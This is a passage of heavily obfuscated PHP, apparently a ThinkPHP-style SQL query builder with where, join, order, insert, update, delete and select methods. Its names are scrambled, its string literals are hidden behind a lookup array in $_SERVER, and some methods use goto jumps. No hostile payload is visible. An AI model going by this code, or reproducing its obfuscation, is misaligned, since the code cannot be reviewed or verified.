¤÷²Ê) { if (is_array($BÊ ¤÷²Ê) && $Dåùºò¸ó[295] == $BÊ ¤÷²Ê[0]) { $A½‡‹²‡„¾[] = $this->parseKey($aØÍİƒé­) . $Dåùºò¸ó[974] . $BÊ ¤÷²Ê[1]; } elseif (is_scalar($BÊ ¤÷²Ê) || is_null($BÊ ¤÷²Ê)) { $A½‡‹²‡„¾[] = $this->parseKey($aØÍİƒé­) . $Dåùºò¸ó[974] . $this->parseValue($BÊ ¤÷²Ê); } } return $Dåùºò¸ó[975] . implode($Dåùºò¸ó[47], $A½‡‹²‡„¾); } protected function bindParam($F™½…Œ¿Û¥, $d™ØÑ¶†ì¬) { $this->bind[$_SERVER[Ôğ—¤Šµˆ˜ñ£][4] . $F™½…Œ¿Û¥] = $d™ØÑ¶†ì¬; } protected function parseBind($c½ÒªÃÚáÉ) { $c½ÒªÃÚáÉ = array_merge($this->bind, $c½ÒªÃÚáÉ); $this->bind = array(); return $c½ÒªÃÚáÉ; } function parseKey(&$BªÂÒ»”Òª, $e¿ÇÆà†Ä¸ = true) { if ($e¿ÇÆà†Ä¸) { $BªÂÒ»”Òª = $this->parseKeyCheck($BªÂÒ»”Òª); } return $BªÂÒ»”Òª; } function parseKeyCheck($bØ–ƒä”Ü·) { $e§ºÆÂ›µ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bØ–ƒä”Ü· = trim($bØ–ƒä”Ü·); if (!preg_match($e§ºÆÂ›µ[976], $bØ–ƒä”Ü·)) { think_exception($e§ºÆÂ›µ[977] . $bØ–ƒä”Ü·); } return $bØ–ƒä”Ü·; } protected function parseValue($Fê¾ÂŞ‘±») { $b’Î¿ô—«‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_string($Fê¾ÂŞ‘±»)) { $Fê¾ÂŞ‘±» = $b’Î¿ô—«‰[939] . $this->escapeString($Fê¾ÂŞ‘±») . $b’Î¿ô—«‰[939]; } elseif (isset($Fê¾ÂŞ‘±»[0]) && is_string($Fê¾ÂŞ‘±»[0]) && strtolower($Fê¾ÂŞ‘±»[0]) == $b’Î¿ô—«‰[295]) { $Fê¾ÂŞ‘±» = $this->escapeString($Fê¾ÂŞ‘±»[1]); } elseif (is_array($Fê¾ÂŞ‘±»)) { $Fê¾ÂŞ‘±» = array_map(array($this, $b’Î¿ô—«‰[940]), $Fê¾ÂŞ‘±»); } elseif (is_bool($Fê¾ÂŞ‘±»)) { $Fê¾ÂŞ‘±» = $Fê¾ÂŞ‘±» ? $b’Î¿ô—«‰[87] : $b’Î¿ô—«‰[191]; } elseif (is_null($Fê¾ÂŞ‘±»)) { $Fê¾ÂŞ‘±» = $b’Î¿ô—«‰[103]; } return $Fê¾ÂŞ‘±»; } protected function parseField($bë­°Ä±Í÷) { $d®µµ¿Ğ¡³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_string($bë­°Ä±Í÷) && strpos($bë­°Ä±Í÷, $d®µµ¿Ğ¡³[47])) { $bë­°Ä±Í÷ = explode($d®µµ¿Ğ¡³[47], $bë­°Ä±Í÷); } if (is_array($bë­°Ä±Í÷)) { $a²óà£Ù¡§ = array(); foreach ($bë­°Ä±Í÷ as $aİºÓòÈ¹¿ => $eö¯ÂñÛ‹) { if (!is_numeric($aİºÓòÈ¹¿)) { $a²óà£Ù¡§[] = $this->parseKey($aİºÓòÈ¹¿, !1) . $d®µµ¿Ğ¡³[978] . $this->parseKey($eö¯ÂñÛ‹); } else { $a²óà£Ù¡§[] = $this->parseKey($eö¯ÂñÛ‹); } } $EË¤Ù”Şù = implode($d®µµ¿Ğ¡³[47], $a²óà£Ù¡§); } elseif (is_string($bë­°Ä±Í÷) && !empty($bë­°Ä±Í÷)) { $EË¤Ù”Şù = $bë­°Ä±Í÷; } else { $EË¤Ù”Şù = $d®µµ¿Ğ¡³[182]; } return $EË¤Ù”Şù; } protected function parseTable($EŠ©¶¦¹‹ã) { $d‡‰ì¬¿Ú =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_array($EŠ©¶¦¹‹ã)) { $f°®ÅÔÔÌã = array(); foreach ($EŠ©¶¦¹‹ã as $föÃù–”š© => $D—äæ´ÆèÅ) { if (!is_numeric($föÃù–”š©)) { $f°®ÅÔÔÌã[] = $this->parseKey($föÃù–”š©) . $d‡‰ì¬¿Ú[50] . $this->parseKey($D—äæ´ÆèÅ); } else { $f°®ÅÔÔÌã[] = $this->parseKey($föÃù–”š©); } } $EŠ©¶¦¹‹ã = $f°®ÅÔÔÌã; } elseif (is_string($EŠ©¶¦¹‹ã)) { if (strstr($EŠ©¶¦¹‹ã, $d‡‰ì¬¿Ú[50])) { return $EŠ©¶¦¹‹ã; } $EŠ©¶¦¹‹ã = explode($d‡‰ì¬¿Ú[47], $EŠ©¶¦¹‹ã); array_walk($EŠ©¶¦¹‹ã, array($this, $d‡‰ì¬¿Ú[889])); } return $d‡‰ì¬¿Ú[883] . trim(implode($d‡‰ì¬¿Ú[979], $EŠ©¶¦¹‹ã), $d‡‰ì¬¿Ú[383]) . $d‡‰ì¬¿Ú[883]; } protected function parseWhere($e¥ÕŞÃŸ©•) { $FÌÔºè¨òƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A­»öÚ…Üõ = $FÌÔºè¨òƒ[33]; if (is_string($e¥ÕŞÃŸ©•)) { $A­»öÚ…Üõ = $e¥ÕŞÃŸ©•; } else { $cÊìëì®†œ = isset($e¥ÕŞÃŸ©•[$FÌÔºè¨òƒ[980]]) ? strtoupper($e¥ÕŞÃŸ©•[$FÌÔºè¨òƒ[980]]) : $FÌÔºè¨òƒ[33]; if (in_array($cÊìëì®†œ, array($FÌÔºè¨òƒ[981], $FÌÔºè¨òƒ[982], $FÌÔºè¨òƒ[983]))) { $cÊìëì®†œ = $FÌÔºè¨òƒ[50] . $cÊìëì®†œ . $FÌÔºè¨òƒ[50]; unset($e¥ÕŞÃŸ©•[$FÌÔºè¨òƒ[980]]); } else { $cÊìëì®†œ = $FÌÔºè¨òƒ[984]; } foreach ($e¥ÕŞÃŸ©• as $dƒÑØ—İÈ => $EÚ‰îù—’‹) { $A­»öÚ…Üõ .= $FÌÔºè¨òƒ[275]; if (is_numeric($dƒÑØ—İÈ)) { $dƒÑØ—İÈ = $FÌÔºè¨òƒ[985]; } if (0 === strpos($dƒÑØ—İÈ, $FÌÔºè¨òƒ[71])) { $A­»öÚ…Üõ .= $this->parseThinkWhere($dƒÑØ—İÈ, $EÚ‰îù—’‹); } else { if (!preg_match($FÌÔºè¨òƒ[986], trim($dƒÑØ—İÈ))) { think_exception(think_lang($FÌÔºè¨òƒ[987]) . $FÌÔºè¨òƒ[4] . $dƒÑØ—İÈ); } $d¢½½ÛíÍÆ = is_array($EÚ‰îù—’‹) && isset($EÚ‰îù—’‹[$FÌÔºè¨òƒ[988]]); $dƒÑØ—İÈ = trim($dƒÑØ—İÈ); if (strpos($dƒÑØ—İÈ, $FÌÔºè¨òƒ[281])) { $c¢‘µ—ù› = explode($FÌÔºè¨òƒ[281], $dƒÑØ—İÈ); $eÑğ÷°Ğ¨ = array(); foreach ($c¢‘µ—ù› as $CÕ•ÌƒÀ…È => $F¡Œ¼´÷åŒ) { $a¹ˆªÔâ»™ = $d¢½½ÛíÍÆ ? $EÚ‰îù—’‹[$CÕ•ÌƒÀ…È] : $EÚ‰îù—’‹; $eÑğ÷°Ğ¨[] = $FÌÔºè¨òƒ[258] . $this->parseWhereItem($this->parseKey($F¡Œ¼´÷åŒ), $a¹ˆªÔâ»™) . $FÌÔºè¨òƒ[888]; } $A­»öÚ…Üõ .= implode($FÌÔºè¨òƒ[989], $eÑğ÷°Ğ¨); } elseif (strpos($dƒÑØ—İÈ, $FÌÔºè¨òƒ[282])) { $c¢‘µ—ù› = explode($FÌÔºè¨òƒ[282], $dƒÑØ—İÈ); $eÑğ÷°Ğ¨ = array(); foreach ($c¢‘µ—ù› as $CÕ•ÌƒÀ…È => $F¡Œ¼´÷åŒ) { $a¹ˆªÔâ»™ = $d¢½½ÛíÍÆ ? $EÚ‰îù—’‹[$CÕ•ÌƒÀ…È] : $EÚ‰îù—’‹; $eÑğ÷°Ğ¨[] = $FÌÔºè¨òƒ[258] . $this->parseWhereItem($this->parseKey($F¡Œ¼´÷åŒ), $a¹ˆªÔâ»™) . $FÌÔºè¨òƒ[888]; } $A­»öÚ…Üõ .= implode($FÌÔºè¨òƒ[984], $eÑğ÷°Ğ¨); } else { $A­»öÚ…Üõ .= $this->parseWhereItem($this->parseKey($dƒÑØ—İÈ), $EÚ‰îù—’‹); } } $A­»öÚ…Üõ .= $FÌÔºè¨òƒ[276] . $cÊìëì®†œ; } $A­»öÚ…Üõ = substr($A­»öÚ…Üõ, 0, -strlen($cÊìëì®†œ)); } return empty($A­»öÚ…Üõ) ? $FÌÔºè¨òƒ[33] : $FÌÔºè¨òƒ[990] . $A­»öÚ…Üõ; } protected function parseWhereItem($cÎ¬É¼ØŒ, $f½º§ß©Ú®) { $a×£äìÂãô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FØëñŠÉïÎ = $a×£äìÂãô[33]; if (is_array($f½º§ß©Ú®)) { if (is_string($f½º§ß©Ú®[0])) { $C‘ÌÎ½¢šš = strtolower($f½º§ß©Ú®[0]); if (in_array($f½º§ß©Ú®[0], array($a×£äìÂãô[974], $a×£äìÂãô[991], $a×£äìÂãô[992], $a×£äìÂãô[993], $a×£äìÂãô[994], $a×£äìÂãô[995]))) { $FØëñŠÉïÎ .= $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $f½º§ß©Ú®[0] . $a×£äìÂãô[50] . $this->parseValue($f½º§ß©Ú®[1]); } elseif (preg_match($a×£äìÂãô[996], $f½º§ß©Ú®[0])) { $FØëñŠÉïÎ .= $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $this->exp[$C‘ÌÎ½¢šš] . $a×£äìÂãô[50] . $this->parseValue($f½º§ß©Ú®[1]); } elseif (preg_match($a×£äìÂãô[997], $f½º§ß©Ú®[0])) { if (is_array($f½º§ß©Ú®[1])) { $B¡¸ÀË¿İŞ = isset($f½º§ß©Ú®[2]) ? strtoupper($f½º§ß©Ú®[2]) : $a×£äìÂãô[982]; if (in_array($B¡¸ÀË¿İŞ, array($a×£äìÂãô[981], $a×£äìÂãô[982], $a×£äìÂãô[983]))) { $Eã‡Çƒ‹Ï = array(); foreach ($f½º§ß©Ú®[1] as $F†ˆŠ”˜ìÛ) { $Eã‡Çƒ‹Ï[] = $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $this->exp[$C‘ÌÎ½¢šš] . $a×£äìÂãô[50] . $this->parseValue($F†ˆŠ”˜ìÛ); } $FØëñŠÉïÎ .= $a×£äìÂãô[258] . implode($a×£äìÂãô[50] . $B¡¸ÀË¿İŞ . $a×£äìÂãô[50], $Eã‡Çƒ‹Ï) . $a×£äìÂãô[888]; } } else { $FØëñŠÉïÎ .= $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $this->exp[$C‘ÌÎ½¢šš] . $a×£äìÂãô[50] . $this->parseValue($f½º§ß©Ú®[1]); } } elseif ($a×£äìÂãô[295] == $C‘ÌÎ½¢šš) { $FØëñŠÉïÎ .= $a×£äìÂãô[886] . $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $f½º§ß©Ú®[1] . $a×£äìÂãô[998]; } elseif (preg_match($a×£äìÂãô[999], $f½º§ß©Ú®[0])) { $FØëñŠÉïÎ .= $f½º§ß©Ú®[0]; } elseif (preg_match($a×£äìÂãô[1000], $f½º§ß©Ú®[0])) { if (isset($f½º§ß©Ú®[2]) && $a×£äìÂãô[295] == $f½º§ß©Ú®[2]) { $FØëñŠÉïÎ .= $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $this->exp[$C‘ÌÎ½¢šš] . $a×£äìÂãô[50] . $f½º§ß©Ú®[1]; } else { if (is_string($f½º§ß©Ú®[1])) { $f½º§ß©Ú®[1] = explode($a×£äìÂãô[47], $f½º§ß©Ú®[1]); } $e†ë»´„¯ù = implode($a×£äìÂãô[47], $this->parseValue($f½º§ß©Ú®[1])); $FØëñŠÉïÎ .= $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $this->exp[$C‘ÌÎ½¢šš] . $a×£äìÂãô[886] . $e†ë»´„¯ù . $a×£äìÂãô[888]; } } elseif (preg_match($a×£äìÂãô[1001], $f½º§ß©Ú®[0])) { $dšö×®Æ³ë = is_string($f½º§ß©Ú®[1]) ? explode($a×£äìÂãô[47], $f½º§ß©Ú®[1]) : $f½º§ß©Ú®[1]; $FØëñŠÉïÎ .= $a×£äìÂãô[886] . $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $this->exp[$C‘ÌÎ½¢šš] . $a×£äìÂãô[50] . $this->parseValue($dšö×®Æ³ë[0]) . $a×£äìÂãô[984] . $this->parseValue($dšö×®Æ³ë[1]) . $a×£äìÂãô[276]; } else { think_exception(think_lang($a×£äìÂãô[987]) . $a×£äìÂãô[4] . $f½º§ß©Ú®[0]); } } else { $fÉ‹ùñÚÇò = count($f½º§ß©Ú®); $F†•ÀÕ‰ä = $a×£äìÂãô[33]; if (is_string($f½º§ß©Ú®[$fÉ‹ùñÚÇò - 1])) { $F†•ÀÕ‰ä = isset($f½º§ß©Ú®[$fÉ‹ùñÚÇò - 1]) ? strtoupper($f½º§ß©Ú®[$fÉ‹ùñÚÇò - 1]) : $a×£äìÂãô[33]; if (in_array($F†•ÀÕ‰ä, array($a×£äìÂãô[981], $a×£äìÂãô[982], $a×£äìÂãô[983]))) { $fÉ‹ùñÚÇò = $fÉ‹ùñÚÇò - 1; } } else { $F†•ÀÕ‰ä = $a×£äìÂãô[981]; } for ($AàŞÑÄçâ = 0; $AàŞÑÄçâ < $fÉ‹ùñÚÇò; $AàŞÑÄçâ++) { $dšö×®Æ³ë = is_array($f½º§ß©Ú®[$AàŞÑÄçâ]) ? $f½º§ß©Ú®[$AàŞÑÄçâ][1] : $f½º§ß©Ú®[$AàŞÑÄçâ]; if ($a×£äìÂãô[295] == strtolower($f½º§ß©Ú®[$AàŞÑÄçâ][0])) { $FØëñŠÉïÎ .= $a×£äìÂãô[258] . $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $dšö×®Æ³ë . $a×£äìÂãô[998] . $F†•ÀÕ‰ä . $a×£äìÂãô[50]; } else { $dãÅ„Ì¼Š• = is_array($f½º§ß©Ú®[$AàŞÑÄçâ]) ? $this->exp[strtolower($f½º§ß©Ú®[$AàŞÑÄçâ][0])] : $a×£äìÂãô[974]; if (!$dãÅ„Ì¼Š• && is_array($f½º§ß©Ú®[$AàŞÑÄçâ]) && in_array($f½º§ß©Ú®[$AàŞÑÄçâ][0], array($a×£äìÂãô[974], $a×£äìÂãô[991], $a×£äìÂãô[992], $a×£äìÂãô[993], $a×£äìÂãô[994], $a×£äìÂãô[995]))) { $dãÅ„Ì¼Š• = $f½º§ß©Ú®[$AàŞÑÄçâ][0]; } $FØëñŠÉïÎ .= $a×£äìÂãô[258] . $cÎ¬É¼ØŒ . $a×£äìÂãô[50] . $dãÅ„Ì¼Š• . $a×£äìÂãô[50] . $this->parseValue($dšö×®Æ³ë) . $a×£äìÂãô[998] . $F†•ÀÕ‰ä . $a×£äìÂãô[50]; } } $FØëñŠÉïÎ = substr($FØëñŠÉïÎ, 0, -4); } } else { $FØëñŠÉïÎ .= $cÎ¬É¼ØŒ . $a×£äìÂãô[1002] . $this->parseValue($f½º§ß©Ú®); } return $FØëñŠÉïÎ; } protected function parseThinkWhere($d×¿Šµê, $d²ãéæéˆ) { $C°ğ¯àåë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Eìô³è†åô = $C°ğ¯àåë[33]; switch ($d×¿Šµê) { case $C°ğ¯àåë[350]: $Eìô³è†åô = $d²ãéæéˆ; break; case $C°ğ¯àåë[985]: $Eìô³è†åô = is_string($d²ãéæéˆ) ? $d²ãéæéˆ : substr($this->parseWhere($d²ãéæéˆ), 6); break; case $C°ğ¯àåë[1003]: parse_str($d²ãéæéˆ, $b×Ö²œ…áƒ); if (isset($b×Ö²œ…áƒ[$C°ğ¯àåë[980]])) { $EÆ¡÷¸»ÂÏ = $C°ğ¯àåë[50] . strtoupper($b×Ö²œ…áƒ[$C°ğ¯àåë[980]]) . $C°ğ¯àåë[50]; unset($b×Ö²œ…áƒ[$C°ğ¯àåë[980]]); } else { $EÆ¡÷¸»ÂÏ = $C°ğ¯àåë[984]; } $aÆŒ‘Ú‚ç = array(); foreach ($b×Ö²œ…áƒ as $A±¹”„“³ => $fš…­ó©Ú„) { $aÆŒ‘Ú‚ç[] = $this->parseKey($A±¹”„“³) . $C°ğ¯àåë[1002] . $this->parseValue($fš…­ó©Ú„); } $Eìô³è†åô = implode($EÆ¡÷¸»ÂÏ, $aÆŒ‘Ú‚ç); break; } return $Eìô³è†åô; } protected function parseLimit($B£ˆ÷¥•ù) { $eÖÏ’ËÛİ¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return !empty($B£ˆ÷¥•ù) ? $eÖÏ’ËÛİ¨[48] . $B£ˆ÷¥•ù . $eÖÏ’ËÛİ¨[50] : $eÖÏ’ËÛİ¨[33]; } protected function parseJoin($Dª¦êÚ‘ Ü) { $Fîëƒ÷Ñ‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B™ˆ®¸Øµ² = $Fîëƒ÷Ñ‘[33]; if (!empty($Dª¦êÚ‘ Ü)) { if (is_array($Dª¦êÚ‘ Ü)) { foreach ($Dª¦êÚ‘ Ü as $aà‡­Âíù‰ => $AéïÁ¶£å) { if (!1 !== stripos($AéïÁ¶£å, $Fîëƒ÷Ñ‘[1004])) { $B™ˆ®¸Øµ² .= $Fîëƒ÷Ñ‘[50] . $AéïÁ¶£å; } else { $B™ˆ®¸Øµ² .= $Fîëƒ÷Ñ‘[1005] . $AéïÁ¶£å; } } } else { $B™ˆ®¸Øµ² .= $Fîëƒ÷Ñ‘[1005] . $Dª¦êÚ‘ Ü; } } $B™ˆ®¸Øµ² = preg_replace($Fîëƒ÷Ñ‘[1006], think_config($Fîëƒ÷Ñ‘[912]) . $Fîëƒ÷Ñ‘[1007], $B™ˆ®¸Øµ²); return $B™ˆ®¸Øµ²; } protected function parseOrder($dË³¤¸×¶é) { $bİ ‡ß´‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_array($dË³¤¸×¶é)) { $Dàª®ˆ†Ò… = array(); foreach ($dË³¤¸×¶é as $fĞíçæÇ½Ş => $Aî™ÉàÏè) { if (is_numeric($fĞíçæÇ½Ş)) { $Dàª®ˆ†Ò…[] = $this->parseKey($Aî™ÉàÏè); } else { $Aî™ÉàÏè = in_array(strtoupper(trim($Aî™ÉàÏè)), array($bİ ‡ß´‘[1008], $bİ ‡ß´‘[1009])) ? $bİ ‡ß´‘[50] . $Aî™ÉàÏè : $bİ ‡ß´‘[33]; if (preg_match($bİ ‡ß´‘[1010], $fĞíçæÇ½Ş)) { $Dàª®ˆ†Ò…[] = $this->parseKey($fĞíçæÇ½Ş) . $Aî™ÉàÏè; } else { think_exception($bİ ‡ß´‘[1011] . $fĞíçæÇ½Ş); } } } $dË³¤¸×¶é = implode($bİ ‡ß´‘[47], $Dàª®ˆ†Ò…); } return !empty($dË³¤¸×¶é) ? $bİ ‡ß´‘[1012] . $dË³¤¸×¶é : $bİ ‡ß´‘[33]; } protected function parseGroup($A‘¿Ò…¿ÎÄ) { $cÌ¢¶Ğ‡ß½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return !empty($A‘¿Ò…¿ÎÄ) ? $cÌ¢¶Ğ‡ß½[1013] . $A‘¿Ò…¿ÎÄ : $cÌ¢¶Ğ‡ß½[33]; } protected function parseHaving($BŸ¯Ş†Æ‘¤) { $bÊ÷œàÆ­† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return !empty($BŸ¯Ş†Æ‘¤) ? $bÊ÷œàÆ­†[1014] . $BŸ¯Ş†Æ‘¤ : $bÊ÷œàÆ­†[33]; } protected function parseComment($aöÇµõŠàØ) { $E§ÑÁ¨¯š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return !empty($aöÇµõŠàØ) ? $E§ÑÁ¨¯š[1015] . $aöÇµõŠàØ . $E§ÑÁ¨¯š[1016] : $E§ÑÁ¨¯š[33]; } protected function parseDistinct($aÚ£ŠæÕì) { $cåŠ‹È×‘± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return !empty($aÚ£ŠæÕì) ? $cåŠ‹È×‘±[1017] : $cåŠ‹È×‘±[33]; } protected function parseUnion($FÔò™¹°±) { $d«àâ±˜Ô  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($FÔò™¹°±)) { return $d«àâ±˜Ô [33]; } if (isset($FÔò™¹°±[$d«àâ±˜Ô [346]])) { $B¼¯åÒ÷ô¢ = $d«àâ±˜Ô [1018]; unset($FÔò™¹°±[$d«àâ±˜Ô [346]]); } else { $B¼¯åÒ÷ô¢ = $d«àâ±˜Ô [1019]; } foreach ($FÔò™¹°± as $FÚ§›Ö…ÙŞ) { $BÎŞÓİÊ»â[] = $B¼¯åÒ÷ô¢ . (is_array($FÚ§›Ö…ÙŞ) ? $this->buildSelectSql($FÚ§›Ö…ÙŞ) : $FÚ§›Ö…ÙŞ); } return implode($d«àâ±˜Ô [50], $BÎŞÓİÊ»â); } public function insert($C·‘ÏƒØÖ‰, $CÖ‚ù¢‡ò» = array(), $CŠœ™Œ……ã = false) { goto cÑâ™Äô “; cÑâ™Äô “: $CØÀ›÷áì¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÌ³ÌÙ„ìà = $e¨•ºŸ¼¾½ = array(); $this->model = $CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[279]]; goto FÑ·º­ïæ; FÑ·º­ïæ: foreach ($C·‘ÏƒØÖ‰ as $D¬Ï¶ìç‘Æ => $b›¼ÑØÇŒ±) { if (is_array($b›¼ÑØÇŒ±) && $CØÀ›÷áì¥[295] == $b›¼ÑØÇŒ±[0]) { $e¨•ºŸ¼¾½[] = $this->parseKey($D¬Ï¶ìç‘Æ); $cÌ³ÌÙ„ìà[] = $b›¼ÑØÇŒ±[1]; } elseif (is_scalar($b›¼ÑØÇŒ±) || is_null($b›¼ÑØÇŒ±)) { $e¨•ºŸ¼¾½[] = $this->parseKey($D¬Ï¶ìç‘Æ); $cÌ³ÌÙ„ìà[] = $this->parseValue($b›¼ÑØÇŒ±); } } $Fåì¿à×Í = ($CŠœ™Œ……ã ? $CØÀ›÷áì¥[890] : $CØÀ›÷áì¥[891]) . $CØÀ›÷áì¥[892] . $this->parseTable($CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[277]]) . $CØÀ›÷áì¥[886] . implode($CØÀ›÷áì¥[47], $e¨•ºŸ¼¾½) . $CØÀ›÷áì¥[887] . implode($CØÀ›÷áì¥[47], $cÌ³ÌÙ„ìà) . $CØÀ›÷áì¥[888]; $Fåì¿à×Í .= $this->parseLock(isset($CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[835]]) ? $CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[835]] : !1); goto A‘Ü²®¯ñ³; A‘Ü²®¯ñ³: $Fåì¿à×Í .= $this->parseComment(!empty($CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[352]]) ? $CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[352]] : $CØÀ›÷áì¥[33]); return $this->execute($Fåì¿à×Í, $this->parseBind(!empty($CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[283]]) ? $CÖ‚ù¢‡ò»[$CØÀ›÷áì¥[283]] : array())); goto fÑÕŸÖõ“ƒ; fÑÕŸÖõ“ƒ: } public function selectInsert($CøêÎ¶Á¼Ö, $e¶øÁƒ›“ç, $e¡¢åêŠŸ¢ = array()) { goto b÷´ì‹…Ô‚; dñƒÁ¹¢©: return $this->execute($aÏñ¢ÔøÊ, $this->parseBind(!empty($e¡¢åêŠŸ¢[$FÙˆÎ¬âÒ”[283]]) ? $e¡¢åêŠŸ¢[$FÙˆÎ¬âÒ”[283]] : array())); goto Bº›Î·ß·; D’×²¼òâá: array_walk($CøêÎ¶Á¼Ö, array($this, $FÙˆÎ¬âÒ”[889])); $aÏñ¢ÔøÊ = $FÙˆÎ¬âÒ”[1020] . $this->parseTable($e¶øÁƒ›“ç) . $FÙˆÎ¬âÒ”[886] . implode($FÙˆÎ¬âÒ”[47], $CøêÎ¶Á¼Ö) . $FÙˆÎ¬âÒ”[998]; $aÏñ¢ÔøÊ .= $this->buildSelectSql($e¡¢åêŠŸ¢); goto dñƒÁ¹¢©; b÷´ì‹…Ô‚: $FÙˆÎ¬âÒ” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->model = $e¡¢åêŠŸ¢[$FÙˆÎ¬âÒ”[279]]; if (is_string($CøêÎ¶Á¼Ö)) { $CøêÎ¶Á¼Ö = explode($FÙˆÎ¬âÒ”[47], $CøêÎ¶Á¼Ö); } goto D’×²¼òâá; Bº›Î·ß·: } public function update($B‹˜‰†Ü—Ä, $a­ãî“»è) { $fğ·ìóÊà¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->model = $a­ãî“»è[$fğ·ìóÊà¤[279]]; $bİ¡…ŒÛ Ú = $fğ·ìóÊà¤[1021] . $this->parseTable($a­ãî“»è[$fğ·ìóÊà¤[277]]) . $this->parseSet($B‹˜‰†Ü—Ä) . $this->parseWhere(!empty($a­ãî“»è[$fğ·ìóÊà¤[273]]) ? $a­ãî“»è[$fğ·ìóÊà¤[273]] : $fğ·ìóÊà¤[33]) . $this->parseOrder(!empty($a­ãî“»è[$fğ·ìóÊà¤[363]]) ? $a­ãî“»è[$fğ·ìóÊà¤[363]] : $fğ·ìóÊà¤[33]) . $this->parseLimit(!empty($a­ãî“»è[$fğ·ìóÊà¤[290]]) ? $a­ãî“»è[$fğ·ìóÊà¤[290]] : $fğ·ìóÊà¤[33]) . $this->parseLock(isset($a­ãî“»è[$fğ·ìóÊà¤[835]]) ? $a­ãî“»è[$fğ·ìóÊà¤[835]] : !1) . $this->parseComment(!empty($a­ãî“»è[$fğ·ìóÊà¤[352]]) ? $a­ãî“»è[$fğ·ìóÊà¤[352]] : $fğ·ìóÊà¤[33]); return $this->execute($bİ¡…ŒÛ Ú, $this->parseBind(!empty($a­ãî“»è[$fğ·ìóÊà¤[283]]) ? $a­ãî“»è[$fğ·ìóÊà¤[283]] : array())); } public function delete($B›ğÈ™ïµó = array()) { $c®ÏµÈõ†‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->model = $B›ğÈ™ïµó[$c®ÏµÈõ†‘[279]]; $F”ŸéİŒ¿¬ = $c®ÏµÈõ†‘[1022] . $this->parseTable($B›ğÈ™ïµó[$c®ÏµÈõ†‘[277]]) . $this->parseWhere(!empty($B›ğÈ™ïµó[$c®ÏµÈõ†‘[273]]) ? $B›ğÈ™ïµó[$c®ÏµÈõ†‘[273]] : $c®ÏµÈõ†‘[33]) . $this->parseOrder(!empty($B›ğÈ™ïµó[$c®ÏµÈõ†‘[363]]) ? $B›ğÈ™ïµó[$c®ÏµÈõ†‘[363]] : $c®ÏµÈõ†‘[33]) . $this->parseLimit(!empty($B›ğÈ™ïµó[$c®ÏµÈõ†‘[290]]) ? $B›ğÈ™ïµó[$c®ÏµÈõ†‘[290]] : $c®ÏµÈõ†‘[33]) . $this->parseLock(isset($B›ğÈ™ïµó[$c®ÏµÈõ†‘[835]]) ? $B›ğÈ™ïµó[$c®ÏµÈõ†‘[835]] : !1) . $this->parseComment(!empty($B›ğÈ™ïµó[$c®ÏµÈõ†‘[352]]) ? $B›ğÈ™ïµó[$c®ÏµÈõ†‘[352]] : $c®ÏµÈõ†‘[33]); return $this->execute($F”ŸéİŒ¿¬, $this->parseBind(!empty($B›ğÈ™ïµó[$c®ÏµÈõ†‘[283]]) ? $B›ğÈ™ïµó[$c®ÏµÈõ†‘[283]] : array())); } public function select($CÔ–¹†¢Ø = array()) { goto dĞ‹×¡·¹; AÇºÉùñ¢É: $cğ¬Ğ„ÁÀ† = isset($CÔ–¹†¢Ø[$D­¬Ï™¾[347]]) ? $CÔ–¹†¢Ø[$D­¬Ï™¾[347]] : !1; if ($cğ¬Ğ„ÁÀ†) { $c‡šœó‡Ö = is_string($cğ¬Ğ„ÁÀ†[$D­¬Ï™¾[93]]) ? $cğ¬Ğ„ÁÀ†[$D­¬Ï™¾[93]] : $D­¬Ï™¾[1023] . md5($b˜‘Ê»éÌÅ); $Aôéé‰Çé¿ = think_cache($c‡šœó‡Ö, $D­¬Ï™¾[33], $cğ¬Ğ„ÁÀ†); if (!1 !== $Aôéé‰Çé¿) { return $Aôéé‰Çé¿; } } $A…óåãšÕ = $this->query($b˜‘Ê»éÌÅ, $this->parseBind(!empty($CÔ–¹†¢Ø[$D­¬Ï™¾[283]]) ? $CÔ–¹†¢Ø[$D­¬Ï™¾[283]] : array())); goto B‰ğâó£¤†; dĞ‹×¡·¹: $D­¬Ï™¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->model = $CÔ–¹†¢Ø[$D­¬Ï™¾[279]]; $b˜‘Ê»éÌÅ = $this->buildSelectSql($CÔ–¹†¢Ø); goto AÇºÉùñ¢É; B‰ğâó£¤†: if ($cğ¬Ğ„ÁÀ† && !1 !== $A…óåãšÕ) { think_cache($c‡šœó‡Ö, $A…óåãšÕ, $cğ¬Ğ„ÁÀ†); } return $A…óåãšÕ; goto eŠ’ù‡«; eŠ’ù‡«: } public function 